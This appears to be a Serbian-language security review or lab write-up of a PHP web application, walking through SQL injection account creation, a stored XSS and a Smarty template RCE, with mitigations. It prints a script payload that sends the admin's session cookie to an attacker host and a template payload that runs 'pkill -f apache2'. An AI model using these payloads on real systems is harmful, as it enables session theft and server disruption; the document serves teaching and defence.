# Bezbednosni pregled koda i analiza

## Zaobilaženje mehanizma autentikacije

## Eskalacija privilegija do administratorskog nivoa

Analizom koda za autorizaciju, primećeno je da se proverava samo da li je username korisnika admin. Budući da nema provere dupliranih username, uspešno smo kreirali nalog napadača pomoću SQL injekcije. Zbog diversifikacije, za metod eskalacije privilegija je ipak izabran XSS u vidu skripte koja bi se učitala samo u podacima koje vidi administrator - u tabeli korisnika. Svi korisnici mogu da ažuriraju opis svog profila pri čemu ne postoji validacija unosa. Kasnije se ti podaci koriste na nesiguran način prilikom učitavanja tabele pri čemu dolazi do **persisted XSS** ranjivosti.

```html
<script>fetch(`http://{attacker_host}:{port}/${{document.cookie}}`);</script>
```

*Exploit* sadrži jedan zahtev ka adresi napadača u kom se šalju *Cookies* koji sadrže **PHPSESSID** admina. Potom se ovaj *session id* koristi u novoj sesiji sa administratorskim pravima. Ranjivost je mogla da bude sprečena zaštitom od XSS (validacija unosa i bezbedno rukovanje ispisom vrednosti) ili sigurnom konfiguracijom *Cookies* sa ograničenjima za slanje samo preko *https* i zabranom pristupa polju *cookie* iz *JavaScript-a*.

## Izvršenje proizvoljnog koda na serveru

Analizom koda možemo primetiti par ranjivosti prilikom promene *Message of the day* poruke i njenog učitavanja. Za promenu poruke neophodno je da korisnik ima privilegije admina koje su dobijene u prethodnom zadatku. Poruka se pre slanja ne proverava i moguće je poslati bilo koji tekst ili kod koji se odmah unosi u *motd.tpl*. Ova ranjivost može dovesti do **XSS** i **RCE** napada. 

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $message = $_POST['message'];

        if ($message !== "") {
            $t_file = fopen("../templates/motd.tpl","w");
            fwrite($t_file, $message);
            fclose($t_file);

            $success = "Message set!";
        } else {
            $error = "Empty message";
        }
    }
```

Druga bitna ranjivost je korišćenje **Smarty** template-a. Njegov posao je da procesuje sintaksu *motd.tpl* kako bi generisao finlani HTML. **Smarty** ima ugrađenu mogućnost da izvršava i PHP kod, što može biti korisno developer-ima ali takođe čini aplikacije ranjivim. 

**RCE** postižemo tako što kao poruku dana pošaljemo maliciozan kod poput:

```php
{php}exec('pkill -f apache2');{/php}
```

Poruka će se bez provere sačuvati. *MOTD* poruke se prikazuju svim korisnicima nakon prijave na sistem. Kada se korisnik prijavi i svaki put kada se učita index stranica, aplikacija će pokušati da mu prikaže poruku dana i maliciozni kod će zbog **Smarty**-ija biti izvršen. 
